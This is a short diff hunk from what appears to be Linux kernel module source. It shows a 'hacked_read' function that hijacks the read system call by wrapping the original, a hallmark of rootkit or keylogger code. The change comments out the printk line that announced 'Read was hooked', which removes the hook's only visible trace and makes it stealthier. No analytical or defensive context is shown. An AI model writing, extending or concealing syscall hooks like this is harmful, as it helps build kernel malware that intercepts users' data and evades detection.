@@ -137,7 +137,7 @@ asmlinkage int hacked_read(unsigned int fd, char *buf, size_t count)
 {
 	int r, i;
 	r = original_read(fd, buf, count);
-    printk("Read was hooked!!!!");
+    //printk("Read was hooked!!!!");
 
 	if (counter)
 	{
